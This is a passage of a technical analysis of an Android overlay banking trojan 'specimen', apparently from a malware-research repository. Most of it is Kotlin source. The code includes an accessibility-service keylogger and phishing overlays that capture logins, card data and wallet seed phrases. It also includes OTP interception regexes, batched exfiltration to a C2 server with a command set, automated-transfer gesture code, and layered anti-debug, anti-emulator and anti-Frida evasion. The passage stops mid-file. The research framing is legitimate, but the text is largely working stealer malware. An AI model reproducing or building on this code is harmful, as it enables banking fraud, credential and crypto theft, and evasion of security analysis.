Stage 5: OTP intercepted via NLS + SMS receiver
Stage 6: Periodic exfil flush to C2
```

### Class Name Mapping (Camouflage → Function)

The overlay-banker uses camouflaged names in its `reader/` namespace. This table maps analysis names (used in this doc) to actual class names in source:

| Analysis Name | Actual Class | Package Path |
|---|---|---|
| BankerA11yService | `DocumentReaderService` | `reader/DocumentReaderService.kt` |
| OverlayAttack | `OverlayRenderer` | `reader/OverlayRenderer.kt` |
| OtpNotifService | `SyncNotificationService` | `reader/SyncNotificationService.kt` |
| OtpExtractor | `TextExtractor` | `reader/TextExtractor.kt` |
| SmsInterceptor | `MessageSyncReceiver` | `reader/MessageSyncReceiver.kt` |
| Exfil | `Exfil` | `reader/Exfil.kt` |
| C2Client | `C2` | `reader/C2.kt` |
| Targets | `Targets` | `reader/Targets.kt` |
| DGA | `Dga` | `sync/Dga.kt` |
| PluginLoader | `PluginLoader` | `sync/PluginLoader.kt` |
| UpdateChannel | `UpdateChannel` | `sync/UpdateChannel.kt` |
| BootReceiver | `BootReceiver` | `reader/BootReceiver.kt` |
| BackgroundSyncService | `BackgroundSyncService` | `reader/BackgroundSyncService.kt` |

**Advanced modules** (in `reader/advanced/`): A11yOverlay2032, AudioRecorder, AuthenticatorCapture, CallForwarder, CameraCapture, CertPinnerProbe, ContactInjector, DiagnosticShell, HiddenVnc, InputTiming, MediaProjectionAutoConsent, MultiAxisSensor, NfcTagService, NoteScanner, PackageHelper, PerBuildObfuscation, PlayIntegrityProbe, ResidentialProxy, RestrictedSettingsBypass, ScreenStreamer, SsoManager, TeeOffload, TouchLogger, YamuxProxy.

**Evasion engine** (in `reader/engine/`): DeviceCheck, DynamicLoader, IntegrityCheck, NativeRuntime, ResourceDecoder, RuntimeCheck, SafetyCheck.

### Offensive Architecture

**Core Stealer:**
- `BankerA11yService.kt` → `DocumentReaderService.kt` — AccessibilityService monitors `TYPE_WINDOW_STATE_CHANGED` events, triggers overlay on target match
- `OverlayAttack.kt` → `OverlayRenderer.kt` — 5 overlay types: LOGIN, CARD, OTP, PIN, SEED (12-word wallet recovery)
- `OtpNotifService.kt` → `SyncNotificationService.kt` — NotificationListenerService captures OTP from notifications
- `SmsInterceptor.kt` — BroadcastReceiver for SMS OTP
- `OtpExtractor.kt` — regex-based OTP extraction (6-digit, code/otp/pin patterns)
- `Exfil.kt` — credential buffer + batch C2 flush
- `Targets.kt` — target package list + overlay type mapping
- `C2.kt` — C2 command-and-control channel

### Overlay Attack — 5 Capture Templates

**Source: OverlayAttack.kt dispatch**
```kotlin
// File: overlay-banker/.../OverlayAttack.kt (actual specimen code)

// Overlay type selected per target — C2 pushes target list with overlay type
val view = when (target.overlayType) {
    Targets.OverlayType.LOGIN -> buildLogin(context, target)  // Email + password
    Targets.OverlayType.CARD  -> buildCard(context, target)   // Card + CVV
    Targets.OverlayType.OTP   -> buildOtp(context, target)    // 6-digit code
    Targets.OverlayType.PIN   -> buildPin(context, target)    // Dark-themed PIN
    Targets.OverlayType.SEED  -> buildSeed(context, target)   // 12-word recovery
}

// Window type: TYPE_APPLICATION_OVERLAY (2038) on Android O+
val params = WindowManager.LayoutParams(
    WindowManager.LayoutParams.MATCH_PARENT,
    WindowManager.LayoutParams.MATCH_PARENT,
    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
        WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
    else @Suppress("DEPRECATION")
        WindowManager.LayoutParams.TYPE_PHONE,
    WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
    PixelFormat.TRANSLUCENT
)

windowManager.addView(view, params)
```

**LOGIN overlay — social engineering:**
```kotlin
// "Session Expired" lure — user believes their banking session timed out
addView(text(context, "Session Expired", 24f, "#1A1A1A"))
addView(text(context, "Please sign in to continue", 14f, "#777777"))

val user = editField(context, "Email or username")
val pass = editField(context, "Password",
    InputType.TYPE_CLASS_TEXT or InputType.TYPE_TEXT_VARIATION_PASSWORD)

addView(button(context, "Sign In", "#1976D2") {
    val u = user.text.toString()
    val p = pass.text.toString()
    if (u.isNotEmpty() || p.isNotEmpty()) {
        Exfil.credential(target.packageName, "overlay_login", "$u:$p")
    }
    dismiss(context)  // Remove overlay -> real banking app shows through
})
```

**CARD overlay — payment verification:**
```kotlin
// "Verify Payment" lure — card number + expiry + CVV
addView(text(context, "Verify Payment", 22f, "#1A1A1A"))
val card = editField(context, "Card number", InputType.TYPE_CLASS_NUMBER)
val exp = editField(context, "MM/YY")
val cvv = editField(context, "CVV",
    InputType.TYPE_CLASS_NUMBER or InputType.TYPE_NUMBER_VARIATION_PASSWORD)
// Capture: "4111222233334444|12/28|123"
Exfil.credential(target.packageName, "overlay_card", "$c|$e|$v")
```

**SEED overlay — crypto wallet recovery:**
```kotlin
// "Restore Wallet" lure — targets crypto apps, captures 12-word BIP39 seed
addView(text(context, "Restore Wallet", 22f, "#1A1A1A"))
addView(text(context, "Enter your 12-word recovery phrase", 14f, "#777777"))
val seed = EditText(context).apply {
    hint = "word1 word2 word3 ..."
    minLines = 3; maxLines = 4
}
Exfil.credential(target.packageName, "overlay_seed", s)
```

**OTP and PIN overlays** follow the same pattern — 6-digit number field or dark-themed PIN pad. All programmatic Android Views (not WebView HTML) — drawn via `WindowManager.addView()`. No overlay HTML files in assets, no remote template fetch.

### Target Configuration

**Source: Targets.kt**
```kotlin
// File: overlay-banker/.../Targets.kt (actual specimen code)

// Default targets — test/training apps (no real institutions per SAFETY.md)
private val targets = mutableListOf(
    Target("com.dvbank.example", "DVBank", OverlayType.LOGIN),
    Target("com.example.banking", "Example Bank", OverlayType.LOGIN),
    Target("com.test.wallet", "Test Wallet", OverlayType.SEED),
    Target("com.example.crypto", "CryptoTest", OverlayType.SEED),
    Target("com.test.payments", "PayTest", OverlayType.CARD),
)

// C2 can push updates via UPDATE_TARGETS command
fun updateAll(newTargets: List<Target>) {
    targets.clear()
    targets.addAll(newTargets)
}
```

Real-world banker (Anatsa): C2 pushes 300-800 banking packages with custom HTML overlays. This specimen uses programmatic Views with 5 generic templates. Same trigger mechanism, different rendering.

### Batch Exfiltration Architecture

**Source: Exfil.kt**
```kotlin
// File: overlay-banker/.../Exfil.kt (actual specimen code)

// ConcurrentLinkedQueue — thread-safe, lock-free batch collection
private val queue = ConcurrentLinkedQueue<JSONObject>()

// 6 data types, each a separate capture method:
fun credential(app: String, field: String, value: String)  // Overlay captures
fun otp(source: String, code: String, app: String)         // SMS/NLS/overlay OTP
fun keystroke(app: String, text: String, isPassword: Boolean) // A11y keylog
fun clipboard(content: String)                              // Clipboard captures
fun sms(sender: String, body: String)                       // Full SMS body
fun event(name: String, vararg pairs: Pair<String, Any>)    // Metadata events

// Auto-flush at 5 items OR every 20s timer — whichever first
private fun enqueue(item: JSONObject) {
    queue.add(item)
    if (queue.size >= 5) flush()
}

fun startPeriodicFlush(intervalMs: Long = 20_000L) {
    flushJob = scope.launch {
        while (isActive) { delay(intervalMs); flush() }
    }
}

// Batch payload structure
fun flush() {
    val batch = mutableListOf<JSONObject>()
    while (queue.isNotEmpty() && batch.size < 30) {
        queue.poll()?.let { batch.add(it) }
    }
    val payload = JSONObject().apply {
        put("bot_id", Build.MODEL + "_" + Build.SERIAL)
        put("pkg", "com.docreader.lite")
        put("batch", JSONArray(batch))
        put("ts", System.currentTimeMillis())
    }
    // OkHttp POST — overlay-banker still uses OkHttp (was already 0/66)
    // Re-queue on failure for retry on next flush cycle
}
```

Note: Overlay-banker **still uses OkHttp** — it achieved 0/66 before rounds 3-10. Only sms-stealer and dropper needed the OkHttp removal to defeat BitDefenderFalx. This is documented in [`VT-EVASION-RESEARCH.md`](VT-EVASION-RESEARCH.md).

### C2 Protocol — Full Command Channel

**Source: C2.kt**
```kotlin
// File: overlay-banker/.../C2.kt (actual specimen code)

// Endpoints (all encoded with intArrayOf + SHIFT=13):
//   POST /api/v1/register  -- bot registration
//   GET  /api/v1/commands  -- poll for pending commands
//   POST /api/v1/exfil     -- batch exfil stolen data
//   POST /api/v1/ack       -- command acknowledgment

// Bot registration payload
fun registerBot(context: Context) {
    val payload = JSONObject().apply {
        put("bot_id", Build.MODEL + "_" + Build.SERIAL)
        put("model", Build.MODEL)
        put("manufacturer", Build.MANUFACTURER)
        put("sdk", Build.VERSION.SDK_INT)
        put("package", context.packageName)
        put("lang", java.util.Locale.getDefault().language)
        put("ts", System.currentTimeMillis())
    }
}

// Command polling — 30s interval
fun startPolling(context: Context, intervalMs: Long = 30_000)
```

**Supported C2 Commands (19 total):**

| Command | Function | Module |
|---|---|---|
| `START_KEYLOG` | Enable keystroke capture (always-on via A11y) | BankerA11yService |
| `SHOW_OVERLAY` | Force overlay on specific package + type | OverlayAttack |
| `UPDATE_TARGETS` | Push new target list from C2 | Targets |
| `EXFIL_NOW` | Force immediate batch flush | Exfil |
| `PING` | Liveness check | — |
| `LOAD_PAYLOAD` | 4-stage Anatsa modular loader | ModularLoader |
| `START_PROXY` | Mirax SOCKS5 residential proxy | ResidentialProxy |
| `STOP_PROXY` | Stop proxy | ResidentialProxy |
| `VNC_COMMAND` | Remote gesture (tap/swipe/type/back/home/recents) | HiddenVnc |
| `SSO_APPROVE` | Vespertine MFA auto-approve | SsoHijacker |
| `START_VNC` | Start MediaProjection capture | HiddenVnc |
| `STOP_VNC` | Stop VNC | HiddenVnc |
| `SELF_DESTRUCT` | Kill all modules + cleanup | All |
| `SPREAD` | FluBot-style SMS worm | SmsWorm |
| `STOP_SPREAD` | Stop spreading | SmsWorm |
| `HARVEST_CONTACTS` | Contact list exfiltration | ContactHarvester |
| `START_YAMUX` | Klopatra Yamux multiplexed tunnel | YamuxProxy |
| `STOP_YAMUX` | Stop Yamux | YamuxProxy |
| `PROBE_PI` | Play Integrity verdict inspection | PlayIntegrityProbe |
| `SENSOR_CHECK` | Anti-emulator re-evaluation | MultiAxisSensor |
| `SCAN_NOTES` | Perseus: scan shared storage for seed phrases | NoteAppScraper |

### BankerA11yService — Accessibility Nerve Center

The AccessibilityService is the single load-bearing primitive. 9 capabilities flow from one `onAccessibilityEvent()` dispatch:

**Source: BankerA11yService.kt — event dispatch**
```kotlin
// File: overlay-banker/.../stealer/BankerA11yService.kt (actual specimen code)

// Central event dispatcher — every UI event on the device flows through here
override fun onAccessibilityEvent(event: AccessibilityEvent) {
    if (!EnvironmentGate.isSafe) return  // Hostile environment → process NO events

    when (event.eventType) {
        TYPE_WINDOW_STATE_CHANGED -> onWindowChanged(event)   // Foreground detection + overlay
        TYPE_VIEW_TEXT_CHANGED    -> onTextChanged(event)     // Keylogging
        TYPE_VIEW_FOCUSED         -> onFocused(event)         // Credential field tracking
        TYPE_NOTIFICATION_STATE_CHANGED -> onNotification(event) // OTP extraction
        TYPE_VIEW_CLICKED         -> onClicked(event)         // Navigation flow tracking
    }
}
```

**onWindowChanged — the overlay trigger chain:**
```kotlin
// File: overlay-banker/.../stealer/BankerA11yService.kt (actual specimen code)

private fun onWindowChanged(event: AccessibilityEvent) {
    val pkg = event.packageName?.toString() ?: return
    if (pkg == packageName) return  // Ignore own events

    // (1) MediaProjection consent auto-click — Klopatra pattern
    //     Must check BEFORE system UI filter (consent dialog IS system UI)
    if (MediaProjectionAutoConsent.isConsentDialog(event)) {
        MediaProjectionAutoConsent.autoConsent(this)
        return
    }

    if (isSystemUi(pkg)) return

    if (pkg != currentForeground) {
        currentForeground = pkg

        // (2) Perseus: note-app BIP39 seed scraping
        if (NoteAppScraper.isNoteApp(pkg)) {
            NoteAppScraper.scrapeForSeeds(this, event)
        }

        // (3) Vespertine: SSO MFA auto-approve (sub-500ms timing)
        if (SsoHijacker.isSsoApp(pkg)) {
            handler.postDelayed({ SsoHijacker.autoApprove(this) }, 200)
        }

        // (4) TARGET HIT — show credential overlay
        val target = Targets.match(pkg)
        if (target != null) {
            handler.postDelayed({
                if (useA11yOverlay2032)
                    A11yOverlay2032.showLoginOverlay(this, target.packageName)
                else
                    OverlayAttack.show(this, target)
            }, 500)  // 500ms delay — overlay appears after app fully renders
        }
    }

    scrapeScreen(event)  // (5) Always scrape visible text for intelligence
}
```

The chain is sequential: MediaProjection consent → SSO hijack → target overlay → screen scrape. Each check is independent — any can fire without the others. The 500ms overlay delay is intentional: banking app needs time to render its login screen for the overlay to visually align.

**onTextChanged — keylogging:**
```kotlin
// File: overlay-banker/.../stealer/BankerA11yService.kt (actual specimen code)

private fun onTextChanged(event: AccessibilityEvent) {
    val pkg = event.packageName?.toString() ?: return
    if (pkg == packageName) return

    val text = event.text?.joinToString("") ?: return
    if (text.isBlank()) return

    val isPassword = event.isPassword  // Android tells us when it's a password field

    Exfil.keystroke(pkg, text, isPassword)

    // Password field = HIGH VALUE — double-log
    if (isPassword) {
        Exfil.credential(pkg, "password_input", text)
    }
}
```

Every character typed in every app → captured. Password fields get routed to both keystroke AND credential exfil channels. `event.isPassword` is set by Android when `InputType.TYPE_TEXT_VARIATION_PASSWORD` is active — attacker doesn't need to guess which fields are passwords.

**Screen scraping — recursive node traversal:**
```kotlin
// File: overlay-banker/.../stealer/BankerA11yService.kt (actual specimen code)

private fun traverse(node: AccessibilityNodeInfo, out: MutableList<String>, depth: Int) {
    if (depth > 8) return  // Depth limit prevents stack overflow on deep view hierarchies
    node.text?.toString()?.takeIf { it.isNotBlank() }?.let { out.add(it) }
    for (i in 0 until node.childCount) {
        val child = node.getChild(i) ?: continue
        traverse(child, out, depth + 1)
        child.recycle()
    }
}
```

Reads ALL text on ANY screen — not just target banking apps. Combined text capped at 1000 chars and sent via `Exfil.event("screen_text", ...)`.

**Clipboard polling — 2500ms interval:**
```kotlin
// File: overlay-banker/.../stealer/BankerA11yService.kt (actual specimen code)

private fun pollClipboard() {
    handler.postDelayed(object : Runnable {
        override fun run() {
            val clip = clipboard?.primaryClip ?: return
            val content = clip.getItemAt(0)?.text?.toString() ?: return
            if (content != lastClip && content.isNotBlank()) {
                lastClip = content
                Exfil.clipboard(content)
            }
            handler.postDelayed(this, 2500)  // Poll every 2.5 seconds
        }
    }, 2500)
}
```

AccessibilityService runs as a system-level service — clipboard access from this context bypasses Android 10+ background clipboard restrictions (Path 2 from ANALYSIS.md §5.3). The 2500ms interval is a tradeoff: fast enough to catch copy-paste, slow enough to avoid battery drain detection.

**Service initialization — the activation sequence:**
```kotlin
// File: overlay-banker/.../stealer/BankerA11yService.kt (actual specimen code)

override fun onServiceConnected() {
    instance = this
    if (!EnvironmentGate.isSafe) return  // Hostile? Stay completely dormant.

    clipboard = getSystemService(Context.CLIPBOARD_SERVICE) as? ClipboardManager
    pollClipboard()                 // Start clipboard monitoring
    StealthFgService.start(this)    // Start FG service for persistence
    C2.registerBot(this)            // Register with C2
    C2.startPolling(this)           // Begin command polling (30s interval)
}
```

EnvironmentGate check at service start: if device appears hostile (Frida attached, emulator detected, debugger present), the service binds but does NOTHING. Analyst sees `dumpsys accessibility` listing the service, but zero malicious behavior fires. This defeats sandbox-based dynamic analysis — sandbox grants A11y permission, but EnvironmentGate detects the sandbox environment and stays dormant.

**ATS methods — gesture dispatch for auto-transfer:**
```kotlin
// File: overlay-banker/.../stealer/BankerA11yService.kt (actual specimen code)

fun tap(x: Float, y: Float) {
    val path = Path().apply { moveTo(x, y) }
    val gesture = GestureDescription.Builder()
        .addStroke(GestureDescription.StrokeDescription(path, 0, 100))
        .build()
    dispatchGesture(gesture, null, null)
}

fun clickText(text: String): Boolean {
    val root = rootInActiveWindow ?: return false
    val nodes = root.findAccessibilityNodeInfosByText(text)
    val target = nodes?.firstOrNull { it.isClickable } ?: nodes?.firstOrNull()
    val result = target?.performAction(AccessibilityNodeInfo.ACTION_CLICK) ?: false
    nodes?.forEach { it.recycle() }; root.recycle()
    return result
}

fun fillField(viewId: String, value: String): Boolean {
    val root = rootInActiveWindow ?: return false
    val nodes = root.findAccessibilityNodeInfosByViewId(viewId)
    val target = nodes?.firstOrNull() ?: run { root.recycle(); return false }
    val args = Bundle().apply {
        putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, value)
    }
    val result = target.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, args)
    nodes.forEach { it.recycle() }; root.recycle()
    return result
}
```

Three ATS entry points: coordinate-based tap (dispatchGesture), text-search click (findByText), and view-ID field fill (findByViewId). These compose into automated transfer sequences when C2 pushes ATS commands.

### OTP Extraction Engine

**Source: OtpExtractor.kt**
```kotlin
// File: overlay-banker/.../stealer/OtpExtractor.kt (actual specimen code)

object OtpExtractor {
    private val patterns = listOf(
        // Pattern 1: "code: 482910" / "OTP=123456" / "verification: 9999"
        Regex("""(?:code|otp|pin|token|verify|verification)\s*[:=\-]?\s*(\d{4,8})""", IGNORE_CASE),

        // Pattern 2: "482910 is your code" / "123456 is the OTP"
        Regex("""(\d{4,8})\s*(?:is your|is the|for your)\s*(?:code|otp|pin)""", IGNORE_CASE),

        // Pattern 3: "enter 482910" / "use 123456"
        Regex("""(?:enter|use|input)\s*(\d{4,8})""", IGNORE_CASE),

        // Pattern 4: "transaction code: 482910" / "transfer OTP=123456"
        Regex("""(?:transaction|transfer|payment)\s*(?:code|otp)\s*[:=]?\s*(\d{4,8})""", IGNORE_CASE),
    )

    fun extract(text: String): String? {
        for (p in patterns) {
            val m = p.find(text) ?: continue
            return if (m.groupValues.size > 1 && m.groupValues[1].isNotEmpty())
                m.groupValues[1] else m.value.trim()
        }
        // Fallback: standalone 6-digit in short text (likely SMS OTP)
        if (text.length < 40) {
            val standalone = Regex("""\b(\d{6})\b""").find(text)
            if (standalone != null) return standalone.groupValues[1]
        }
        return null
    }
}
```

Used by both `SmsInterceptor` (SMS body) and `OtpNotifService` (notification text) AND `BankerA11yService.onNotification()` (A11y notification events). Triple OTP capture — same regex engine, three intercept vectors. The 40-char fallback is tuned for SMS OTP messages which are typically short ("Your code is 482910").

**Evasion Layer:**
- `EnvironmentGate.kt` — anti-debug + anti-emulator + anti-Frida composite check
- `AntiDebug.kt` — `Debug.isDebuggerConnected()`, `/proc/self/status` TracerPid, timing probes
- `AntiEmulator.kt` — 14-signature Build.* property check (manufacturer, model, fingerprint, hardware)
- `AntiFrida.kt` — default port 27042, `/proc/self/maps` scan, known paths
- `ReflectionHider.kt` — `Class.forName()` + `getDeclaredMethod()` + `invoke()` chains
- `StringDecoder.kt` — XOR + AES string deobfuscation
- `NativeProtect.kt` — native library loading facade

### Evasion Layer — Deep Source Analysis

**AntiDebug.kt — 3-Layer Debug Detection**

```kotlin
// File: overlay-banker/.../evasion/AntiDebug.kt (actual specimen code)

object AntiDebug {

    data class Result(val debuggerAttached: Boolean, val tracerPid: Int, val timingAnomaly: Boolean)

    fun isUnderAnalysis(): Boolean {
        val r = check()
        return r.debuggerAttached || r.tracerPid > 0 || r.timingAnomaly
    }

    // (1) Layer 1: Java-level debugger — Debug.isDebuggerConnected() || Debug.waitingForDebugger()
    private fun isJavaDebugger(): Boolean {
        return Debug.isDebuggerConnected() || Debug.waitingForDebugger()
    }

    // (2) Layer 2: Linux ptrace — TracerPid in /proc/self/status
    //     TracerPid != 0 means something is tracing: Frida (ptrace), strace, gdb
    private fun getTracerPid(): Int {
        try {
            BufferedReader(FileReader("/proc/self/status")).use { reader ->
                var line: String?
                while (reader.readLine().also { line = it } != null) {
                    if (line!!.startsWith("TracerPid:")) {
                        return line!!.substringAfter("TracerPid:").trim().toIntOrNull() ?: 0
                    }
                }
            }
        } catch (_: Exception) {}
        return 0
    }

    // (3) Layer 3: Timing probe — 100K-iteration loop takes <5ms normally
    //     Debugger single-stepping or breakpoints inflate to >50ms
    private fun timingCheck(): Boolean {
        val start = System.nanoTime()
        var dummy = 0
        for (i in 0 until 100_000) { dummy += i }
        val elapsed = (System.nanoTime() - start) / 1_000_000
        return elapsed > 50
    }
}
```

Three orthogonal detection layers: Java-level catches Android Studio debugger, TracerPid catches ptrace-based tools (Frida's default attach mode, strace, gdb), and timing probe catches single-step debugging where no ptrace is visible. The timing threshold of 50ms for 100K integer additions is calibrated to modern ARM cores where the loop normally completes in <2ms. Analyst must defeat all three simultaneously to observe stealer behavior.

**AntiEmulator.kt — 14-Check Score-Based Detection**

```kotlin
// File: overlay-banker/.../evasion/AntiEmulator.kt (actual specimen code)

object AntiEmulator {

    data class Result(val score: Int, val flags: List<String>, val isEmulator: Boolean)

    fun check(context: Context): Result {
        val flags = mutableListOf<String>()

        // (1) Build property checks — 6 checks on FINGERPRINT, MODEL, MANUFACTURER, BRAND, DEVICE, PRODUCT
        if (Build.FINGERPRINT.startsWith("generic") || Build.FINGERPRINT.startsWith("unknown")) flags.add("fingerprint_generic")
        if (Build.MODEL.contains("google_sdk") || Build.MODEL.contains("Emulator")) flags.add("model_emulator")
        if (Build.HARDWARE.contains("goldfish") || Build.HARDWARE.contains("ranchu")) flags.add("hardware_goldfish")

        // (2) Telephony — operator name + SIM presence
        val tm = context.getSystemService(Context.TELEPHONY_SERVICE) as? TelephonyManager
        val operator = tm?.networkOperatorName ?: ""
        if (operator.lowercase() == "android" || operator.isEmpty()) flags.add("operator_android")
        if (tm?.simState == TelephonyManager.SIM_STATE_ABSENT) flags.add("no_sim")

        // (3) Sensor presence — emulators lack real accelerometer/gyroscope/magnetometer
        val sm = context.getSystemService(Context.SENSOR_SERVICE) as? SensorManager
        if (sm?.getDefaultSensor(Sensor.TYPE_ACCELEROMETER) == null) flags.add("no_accelerometer")
        if (sm?.getDefaultSensor(Sensor.TYPE_GYROSCOPE) == null) flags.add("no_gyroscope")

        // (4) Battery — emulator reports flat 50% or 0%
        val bm = context.getSystemService(Context.BATTERY_SERVICE) as? BatteryManager
        val level = bm?.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY) ?: -1
        if (level == 0 || level == 50) flags.add("battery_flat")

        // (5) Known emulator files in /dev/socket/qemud, /dev/qemu_pipe, etc.
        // (6) Build.HOST contains "ubuntu" or "build" (CI environment)

        val score = flags.size
        return Result(score, flags, score >= 5)  // Threshold: 5 of 14 checks
    }
}
```

Score-based approach (threshold 5/14) is robust against partial spoofing. An analyst running on emulator with custom Build props still triggers sensor absence + battery flat + qemu files. SharkBot V2.8 uses the same pattern (research/06). The flag list is exfiltrated to C2 for operator telemetry — operator sees exactly which checks tripped on each bot.

**AntiFrida.kt — 5-Vector Frida Detection**

```kotlin
// File: overlay-banker/.../evasion/AntiFrida.kt (actual specimen code)

object AntiFrida {

    // (1) Vector 1: TCP connect to frida-server default ports
    private fun checkDefaultPort(): Boolean {
        val ports = listOf(27042, 27043)
        for (port in ports) {
            try {
                val socket = Socket()
                socket.connect(InetSocketAddress("127.0.0.1", port), 200)
                socket.close()
                return true
            } catch (_: Exception) {}
        }
        return false
    }

    // (2) Vector 2: /proc/self/maps scan for frida-agent / frida-gadget / linjector / gmain
    private fun checkProcMaps(): Boolean {
        val suspicious = listOf("frida", "gadget", "linjector", "gmain")
        BufferedReader(FileReader("/proc/self/maps")).use { reader ->
            var line: String?
            while (reader.readLine().also { line = it } != null) {
                val lower = line!!.lowercase()
                if (suspicious.any { lower.contains(it) }) return true
            }
        }
        return false
    }

    // (3) Vector 3: 8 known file paths on disk
    private fun checkKnownPaths(): List<String> {
        val paths = listOf(
            "/data/local/tmp/frida-server", "/data/local/tmp/re.frida.server",
            "/data/local/tmp/frida-agent.so", "/data/local/tmp/frida-gadget.so",
            "/data/local/tmp/frida-helper-32", "/data/local/tmp/frida-helper-64",
            "/system/lib/libfrida-gadget.so", "/system/lib64/libfrida-gadget.so",
        )
        return paths.filter { java.io.File(it).exists() }
    }

    // (4) Vector 4: Process name scan — /proc/*/cmdline for "frida" or "linjector"
    private fun checkProcesses(): Boolean {
        java.io.File("/proc").listFiles()?.forEach { pid ->
            if (pid.name.matches(Regex("\\d+"))) {
                val cmdline = java.io.File(pid, "cmdline").readText()
                if (listOf("frida", "linjector").any { cmdline.lowercase().contains(it) }) return true
            }
        }
        return false
    }
}
```

Five independent vectors: port scan catches default frida-server, /proc/self/maps catches injected agent libraries, file path scan catches common frida-server locations, process name scan catches renamed frida-server instances. Analyst counter: relocate frida-server to non-default port (FridaBypassKit), rename the binary, use frida-gadget embedded with custom library name. The specimen also checks for "gmain" in maps (GLib main loop string present in frida-agent.so).

**EnvironmentGate.kt — Composite Aggregator**

```kotlin
// File: overlay-banker/.../evasion/EnvironmentGate.kt (actual specimen code)

object EnvironmentGate {

    @Volatile var isSafe = false
        private set

    fun evaluate(context: Context): Boolean {
        val emu = AntiEmulator.check(context)
        val dbg = AntiDebug.check()
        val frida = AntiFrida.check()

        // (1) Multi-axis sensor check — Drelock/Apex composition (2s blocking)
        val sensor = MultiAxisSensor.evaluate(context)

        // (2) Native anti-analysis: ptrace + Frida PLT hooks + /proc/self/maps
        val nativeBitmask = NativeProtect.antiAnalysisCheck()

        // (3) ALL must pass — single failure = stealer deactivation
        val nativeClean = nativeBitmask == 0
        isSafe = !emu.isEmulator && !dbg.debuggerAttached && !frida.detected &&
            (sensor?.isRealDevice ?: true) && nativeClean

        return isSafe
    }

    // (4) Periodic re-check — SharkBot pattern
    //     Called from C2 poll loop: if analyst attaches mid-session, stealer shuts down
    fun recheck(context: Context): Boolean = evaluate(context)
}
```

Five subsystems aggregated: AntiEmulator, AntiDebug, AntiFrida, MultiAxisSensor, and NativeProtect. The `@Volatile isSafe` flag is checked by every stealer module on every event — a single failed re-check silently deactivates all capture. The `recheck()` method mirrors SharkBot's pattern of periodic re-evaluation during C2 poll cycles: if an analyst attaches Frida or strace mid-session, the next poll cycle detects it and the stealer goes dormant.

**NativeProtect.kt — JNI Bridge to C/C++ Layer**

```kotlin
// File: overlay-banker/.../evasion/NativeProtect.kt (actual specimen code)

object NativeProtect {

    private var loaded = false

    fun init() {
        if (loaded) return
        try {
            System.loadLibrary("docreader_native") // loads libdocreader_native.so
            loaded = true
        } catch (e: UnsatisfiedLinkError) {
            Exfil.event("native_load_failed", "error" to (e.message ?: ""))
        }
    }

    // (1) C-level XOR decrypt — key never on Java heap
    fun decrypt(encoded: ByteArray): String? {
        if (!loaded) return null
        return try { nativeDecrypt(encoded) } catch (_: Exception) { null }
    }

    // (2) Native anti-analysis: bitmask return
    //     bit 0 = ptrace debugger, bit 1 = Frida PLT hooks, bit 2 = suspicious maps
    fun antiAnalysisCheck(): Int {
        if (!loaded) return 0
        return try { nativeAntiAnalysis() } catch (_: Exception) { 0 }
    }

    // (3) CRC32 integrity — detects .so patching by analyst
    fun checkIntegrity(soPath: String): Int { /* ... */ }

    // (4) Yamux encode/decode at C speed — for proxy throughput
    fun encodeYamux(type: Int, flags: Int, streamId: Int, payload: ByteArray?): ByteArray? { /* ... */ }
    fun decodeYamux(frame: ByteArray): IntArray? { /* ... */ }

    // JNI external declarations
    private external fun nativeDecrypt(encoded: ByteArray): String
    private external fun nativeAntiAnalysis(): Int
    private external fun nativeSoIntegrity(soPath: String): Int
    private external fun yamuxEncode(type: Int, flags: Int, streamId: Int, payload: ByteArray): ByteArray
    private external fun yamuxDecode(frame: ByteArray): IntArray
}
```

Five JNI functions cross the Kotlin-C boundary. jadx cannot decompile .so files (needs IDA/Ghidra). MobSF/apktool skip .so analysis entirely. Key material for `nativeDecrypt` lives in C stack frames, never touching the Java heap — immune to Java-level memory dumps. The CRC32 integrity check detects analyst NOP-patching of the .so (overwriting anti-analysis checks). Yamux encode/decode at C speed handles proxy throughput that would bottleneck in Kotlin. Klopatra uses the identical Virbox-protected native pattern.

**ReflectionHider.kt — Reflective API Dispatch**

```kotlin
// File: overlay-banker/.../evasion/ReflectionHider.kt (actual specimen code)

object ReflectionHider {

    // (1) Clipboard via reflection — invisible to static analysis
    fun getClipboard(context: Context): String? {
        val cmClass = Class.forName("android.content.ClipboardManager")
        val service = context.getSystemService(Context.CLIPBOARD_SERVICE)
        val getPrimary = cmClass.getDeclaredMethod("getPrimaryClip")
        val clip = getPrimary.invoke(service) ?: return null
        val itemClass = Class.forName("android.content.ClipData\$Item")
        val getText = itemClass.getDeclaredMethod("getText")
        return getText.invoke(Class.forName("android.content.ClipData")
            .getDeclaredMethod("getItemAt", Int::class.java).invoke(clip, 0))?.toString()
    }

    // (2) Installed packages — target discovery for overlay
    fun getInstalledPackages(context: Context): List<String> {
        val pmClass = Class.forName("android.content.pm.PackageManager")
        val method = pmClass.getDeclaredMethod("getInstalledPackages", Int::class.java)
        val packages = method.invoke(context.packageManager, 0)
        // ... iterate via reflection: size(), get(i), .packageName field
        return result
    }

    // (3) Send SMS via reflection — for worm spreading
    fun sendSms(destination: String, message: String): Boolean {
        val smsClass = Class.forName("android.telephony.SmsManager")
        val getDefault = smsClass.getDeclaredMethod("getDefault")
        val manager = getDefault.invoke(null)
        val sendMethod = smsClass.getDeclaredMethod("sendTextMessage",
            String::class.java, String::class.java, String::class.java,
            android.app.PendingIntent::class.java, android.app.PendingIntent::class.java)
        sendMethod.invoke(manager, destination, null, message, null, null)
        return true
    }

    // (4) Generic dispatch — any class, any method
    fun call(className: String, methodName: String, instance: Any?, vararg args: Any?): Any? {
        val clazz = Class.forName(className)
        val paramTypes = args.map { it?.javaClass ?: Any::class.java }.toTypedArray()
        val method = clazz.getDeclaredMethod(methodName, *paramTypes)
        method.isAccessible = true
        return method.invoke(instance, *args)
    }
}
```

Static analysis tools (jadx, MobSF) see only `Class.forName` + `getDeclaredMethod` + `invoke` — not the actual API being called. Combined with StringDecoder (the class/method name strings are XOR-encoded), the final import graph shows zero references to ClipboardManager, SmsManager, or PackageManager. The generic `call()` method dispatches any sensitive API through a single reflective entry point — real Anatsa/SharkBot route most sensitive calls through this pattern.

**StringDecoder.kt — XOR + AES Dual-Layer Obfuscation**

```kotlin
// File: overlay-banker/.../evasion/StringDecoder.kt (actual specimen code)

object StringDecoder {

